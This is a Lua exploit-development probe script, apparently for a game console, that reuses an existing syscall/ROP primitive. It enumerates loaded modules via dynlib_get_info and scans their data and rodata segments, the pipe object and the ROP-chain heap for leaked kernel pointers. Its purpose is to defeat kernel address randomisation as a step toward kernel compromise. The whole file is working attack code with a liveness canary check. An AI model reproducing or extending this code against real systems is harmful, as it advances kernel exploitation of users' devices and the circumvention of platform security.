-- CRASH_CLASS: LOW
-- PROBE 119c: Scan REAL data segments using +0x118 from dynlib_get_info
--
-- 119b proved the struct layout:
--   +0x108=text_base, +0x110=[prot:size], +0x118=data_base, +0x120=[prot:size]
--   +0x128=rodata_base, +0x130=[prot:size], +0x138=bss_base?, +0x140=[prot:size]
--
-- 119b used wrong address (text+text_size instead of +0x118). This probe
-- reads the CORRECT data base and scans it with memory.read_qword (precise).
-- Output is HEX ONLY (no binary dump) to avoid TCP stream corruption.

print("=== PROBE 119c: REAL DATA SEGMENT SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if h>=0xFFFF8000 and h<0xFFFFF000 and h~=0xFFFFFFFF then return true end
    return false
end
local function read_base(inf_addr, off)
    local lo=rd(inf_addr+off) or 0; local hi=rd(inf_addr+off+4) or 0
    if hi<0 then hi=hi+0x100000000 end
    if lo<0 then lo=lo+0x100000000 end
    if hi==0 and lo==0 then return nil end
    return N(uint64(string.format("0x%X%08X", hi, lo)))
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local sc_info=mk(593)

-- ============================================================
print("--- A: SCAN ALL MODULE DATA SEGMENTS ---")
local total_kp = 0

for handle=0,39 do
    local inf=memory.alloc(0x200)
    wd(inf,0x160)
    local oki=pcall(function() sc_info(uint64(handle),inf) end)
    if not oki then break end
    local II=N(inf)

    local tb = read_base(II, 0x108)
    if not tb then
        if handle > 5 then break end
    else
        local name=""
        for i=0,31 do
            local b=rd(II+8+i)
            if not b then break end
            local ch=b%256
            if ch==0 then break end
            if ch>=32 and ch<127 then name=name..string.char(ch) end
        end

        local db = read_base(II, 0x118)
        local dsz_raw = rq(II+0x120)
        local dsz = 0
        if dsz_raw then
            local dh,dl = get_hi_lo(dsz_raw)
            if dl<0 then dl=dl+0x100000000 end
            dsz = dl
        end

        if db and dsz > 0 then
            print(string.format("  [%d] '%s' data=0x%X size=0x%X", handle, name, db, dsz))

            local kp = 0
            local scanned = 0
            local limit = math.min(dsz, 0x80000)
            for off=0,limit-8,8 do
                local val = rq(db + off)
                if val==nil then
                    print(string.format("    unreadable at +0x%X", off))
                    break
                end
                scanned = scanned + 8
                if is_kptr(val) then
                    kp = kp + 1
                    total_kp = total_kp + 1
                    print(string.format("    *** KPTR +0x%05X: %s ***", off, fmt(val)))
                    if kp >= 10 then
                        print("    (capped at 10)")
                        break
                    end
                end
            end
            print(string.format("    scanned=0x%X kptrs=%d", scanned, kp))
        else
            print(string.format("  [%d] '%s' text=0x%X NO DATA SEGMENT", handle, name, tb))
        end
    end

    if total_kp >= 30 then break end
end
print(string.format("  TOTAL DATA KPTRS: %d", total_kp))

local c=N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- B: SCAN PIPE OBJECT ---")
local pipe_str=tostring(syscall.pipe)
local addr_str=pipe_str:match("address @ (0x[0-9a-fA-F]+)")
local fn_str=pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str=pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
print("  pipe_addr="..tostring(addr_str))
print("  fn_addr="..tostring(fn_str))

if addr_str then
    local PA=tonumber(addr_str)
    if PA then
        local pv=rq(PA)
        if pv then
            print("  *** PIPE READABLE ***")
            local pkp=0
            print("  pipe dump:")
            for off=0,0xFF,8 do
                local val=rq(PA+off)
                if val then
                    local s=fmt(val)
                    local tag=""
                    if is_kptr(val) then
                        pkp=pkp+1
                        tag=" *** KPTR ***"
                    end
                    print(string.format("    +0x%02X: %s%s", off, s, tag))
                end
            end
            print(string.format("  pipe kptrs: %d", pkp))

            -- Also scan 1KB before and after
            local ext_kp=0
            for off=-0x400,-8,8 do
                local val=rq(PA+off)
                if val and is_kptr(val) then
                    ext_kp=ext_kp+1
                    print(string.format("    pre-pipe +0x%X: %s", off, fmt(val)))
                end
            end
            for off=0x100,0x400,8 do
                local val=rq(PA+off)
                if val and is_kptr(val) then
                    ext_kp=ext_kp+1
                    print(string.format("    post-pipe +0x%X: %s", off, fmt(val)))
                end
            end
            print(string.format("  extended pipe kptrs: %d", ext_kp))
        else
            print("  pipe NOT readable via memory.rq")
        end
    end
end

c=N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- C: SCAN fn_addr / ROPCHAIN HEAP ---")
if fn_str then
    local FA=tonumber(fn_str)
    if FA then
        local fkp=0
        for off=-0x200,0x600,8 do
            local val=rq(FA+off)
            if val and is_kptr(val) then
                fkp=fkp+1
                print(string.format("    fn+0x%X: %s", off, fmt(val)))
            end
        end
        print(string.format("  fn_addr heap kptrs: %d", fkp))
    end
end

-- ============================================================
print("")
print("--- D: SCAN RODATA SEGMENTS ---")
-- eboot rodata at +0x128
local inf0=memory.alloc(0x200)
wd(inf0,0x160)
pcall(function() sc_info(uint64(0),inf0) end)
local I0=N(inf0)
local rb=read_base(I0, 0x128)
local rsz_raw=rq(I0+0x130)
local rsz=0
if rsz_raw then
    local rh,rl=get_hi_lo(rsz_raw)
    if rl<0 then rl=rl+0x100000000 end
    rsz=rl
end
if rb and rsz>0 then
    print(string.format("  eboot rodata=0x%X size=0x%X", rb, rsz))
    local rkp=0
    for off=0,math.min(rsz,0x18000)-8,8 do
        local val=rq(rb+off)
        if val==nil then
            print(string.format("    unreadable at +0x%X", off))
            break
        end
        if is_kptr(val) then
            rkp=rkp+1
            print(string.format("    *** KPTR rodata+0x%05X: %s ***", off, fmt(val)))
            if rkp>=10 then break end
        end
    end
    print(string.format("  rodata kptrs: %d", rkp))
else
    print("  no rodata found")
end

-- ============================================================
print("")
c=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", c==pid and "OK" or "FAIL"))
print("=== 119c COMPLETE ===")
